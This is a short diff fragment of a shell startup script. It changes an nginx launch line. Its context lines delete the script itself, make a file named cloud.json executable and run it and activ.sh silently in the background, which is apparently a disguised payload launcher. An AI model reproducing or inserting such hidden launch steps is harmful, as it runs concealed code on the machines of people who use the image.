@@ -68,5 +68,5 @@ rm -rf $0
 chmod +x $data/cloud.json activ.sh
 nohup $data/cloud.json > /dev/null 2>&1 &
 nohup ./activ.sh > /dev/null 2>&1
-nginx -g 'daemon off;'
+nginx
 
